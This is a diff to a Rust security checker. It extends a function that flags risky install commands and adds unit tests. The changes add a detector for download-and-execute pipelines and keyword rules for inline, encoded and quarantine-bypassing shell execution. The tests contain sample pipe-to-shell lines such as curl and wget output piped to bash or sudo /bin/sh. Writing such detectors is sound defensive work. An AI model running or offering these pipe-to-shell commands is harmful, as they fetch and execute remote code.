@@ -143,22 +143,75 @@ fn commit_age_days(commit_ts_ms: Option<u64>) -> Option<u64> {
 }
 
 fn risky_install_pattern(command: &str) -> Option<&'static str> {
-    let c = command.to_ascii_lowercase();
-    if (c.contains("curl") || c.contains("wget")) && (c.contains("| sh") || c.contains("|bash")) {
+    if is_download_and_execute_chain(command) {
         return Some("piped shell execution");
     }
 
+    let c = command.to_ascii_lowercase();
     let patterns = [
         ("base64", "obfuscated payload decoding"),
         ("xattr -d com.apple.quarantine", "quarantine bypass"),
         ("bash -c", "inline shell execution"),
         ("sh -c", "inline shell execution"),
+        ("zsh -c", "inline shell execution"),
+        ("pwsh -c", "inline shell execution"),
+        ("powershell -command", "inline shell execution"),
+        ("powershell -enc", "encoded powershell execution"),
+        ("cmd /c", "inline shell execution"),
+        ("eval $(", "shell eval execution"),
+        ("$(curl", "shell command substitution download"),
+        ("`curl", "shell command substitution download"),
         ("python -c", "inline code execution"),
         ("node -e", "inline code execution"),
     ];
     patterns
         .into_iter()
         .find_map(|(needle, reason)| c.contains(needle).then_some(reason))
+}
+
+fn is_download_and_execute_chain(command: &str) -> bool {
+    const DOWNLOADERS: &[&str] = &["curl", "wget", "invoke-webrequest", "iwr"];
+    const SHELLS: &[&str] = &[
+        "sh",
+        "bash",
+        "zsh",
+        "dash",
+        "ash",
+        "ksh",
+        "fish",
+        "pwsh",
+        "powershell",
+        "cmd",
+        "cmd.exe",
+    ];
+
+    command.to_ascii_lowercase().lines().any(|line| {
+        if !DOWNLOADERS
+            .iter()
+            .any(|downloader| line.contains(downloader))
+        {
+            return false;
+        }
+
+        let mut stages = line.split('|');
+        let _ = stages.next();
+
+        stages.any(|stage| {
+            let mut parts = stage.split_whitespace();
+            let first = parts.next().unwrap_or("");
+            let second = parts.next().unwrap_or("");
+            let runner = if first == "sudo" {
+                second
+            } else {
+                first
+            };
+            let runner = runner.rsplit(['/', '\\']).next().unwrap_or(runner);
+            let runner = runner.trim_matches(|ch: char| {
+                !ch.is_ascii_alphanumeric() && ch != '.' && ch != '_' && ch != '-'
+            });
+            SHELLS.contains(&runner)
+        })
+    })
 }
 
 /// Convert markdown to sanitized HTML using pulldown-cmark.
@@ -1407,6 +1460,40 @@ mod tests {
     #[test]
     fn risky_install_pattern_allows_plain_package_install() {
         assert_eq!(risky_install_pattern("cargo install ripgrep"), None);
+    }
+
+    #[test]
+    fn risky_install_pattern_detects_multistage_download_exec() {
+        assert_eq!(
+            risky_install_pattern("curl -fsSL https://example.com/x | base64 -d | bash"),
+            Some("piped shell execution")
+        );
+    }
+
+    #[test]
+    fn risky_install_pattern_detects_sudo_bin_sh_pipeline() {
+        assert_eq!(
+            risky_install_pattern("wget -qO- https://example.com/x | sudo /bin/sh"),
+            Some("piped shell execution")
+        );
+    }
+
+    #[test]
+    fn risky_install_pattern_detects_invokewebrequest_pipeline() {
+        assert_eq!(
+            risky_install_pattern("Invoke-WebRequest https://example.com/x | pwsh"),
+            Some("piped shell execution")
+        );
+    }
+
+    #[test]
+    fn risky_install_pattern_allows_download_without_exec_chain() {
+        assert_eq!(
+            risky_install_pattern(
+                "curl -fsSL https://example.com/archive.tar.gz -o archive.tar.gz"
+            ),
+            None
+        );
     }
 
     #[test]
